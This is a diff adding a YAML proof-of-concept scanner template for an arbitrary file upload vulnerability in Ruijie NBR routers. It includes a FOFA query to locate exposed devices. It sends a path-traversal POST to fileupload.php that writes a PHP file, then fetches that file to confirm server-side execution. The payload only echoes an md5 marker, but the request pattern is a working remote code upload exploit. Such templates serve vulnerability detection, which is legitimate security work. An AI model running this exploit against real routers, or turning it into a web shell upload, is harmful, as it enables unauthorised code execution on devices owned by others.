@@ -1,0 +1,23 @@
+id: poc-yaml-ruijie-nbr-ddi-fileupload
+info:
+  name: 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: Ruijie-NBR路由器
+  fofa: title="锐捷网络-EWEB网管系统" || app="Ruijie-NBR路由器"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ddi/server/fileupload.php?uploadDir=../../test&name={{.t1}}.php
+  headers:
+    Content-Type: image/jpeg
+  data: <?php echo md5({{.t1}});?>
+  expression: "status_code == 200 && \ncontains(find_json(body,\"result\"), \".php\"\
+    )\n"
+- method: GET
+  path: /test/{{.t1}}.php
+  expression: "status_code == 200 && \nbody == t2\n"
+transport: http
